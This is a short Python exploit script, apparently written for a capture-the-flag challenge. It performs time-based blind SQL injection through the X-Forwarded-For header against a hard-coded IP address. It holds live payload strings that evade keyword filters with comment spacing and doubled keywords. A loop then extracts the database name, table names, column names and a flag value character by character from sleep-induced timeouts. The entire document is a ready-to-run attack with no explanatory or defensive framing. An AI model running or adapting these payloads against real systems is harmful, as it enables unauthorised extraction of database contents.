import requests
import string

url="http://49.4.68.67:82/"

# payload="127.0.0.1'/**/and/**/if((substr((select/**/database()),{},1)='{}'),sleep(5),1)/**/and/**/'1'='0"
# payload="127.0.0.1'/**/and/**/if((substr((seselectlect/**/group_concat(column_name)/**/frfromom/**/information_schema.columns),{},1)='{}'),sleep(5),1)/**/and/**/'1'='0"

# payload="127.0.0.1'/**/and/**/if((substr((selselectect/**/table_name/**/frfromom/**/information_schema.tables/**/where/**/table_schema='demo2',{},1)='{}'),sleep(5),1)/**/and/**/'1'='0"
payload="127.0.0.1'/**/and/**/if((ascii(substr((seselectlect/**/fl4g/**/ffromrom/**/flaaag),{},1))={}),sleep(5),1)/**/and/**/'1'='0"

flag=""
guess = string.ascii_letters+string.digits+string.punctuation
#flaaag
for i in range(1,40): 
  print("round: "+ str(i))
  for j in guess:
    tmp = j
    j = ord(j)
    headers={
        "X-Forwarded-For" : payload.format(i,j)   
    }
    print("[+]"+ payload.format(i,j))
    # re = requests.get(url,headers=headers)
    try:
      re=requests.get(url,headers=headers,timeout=4)
    except:
      flag = flag + tmp
      break
  print(flag)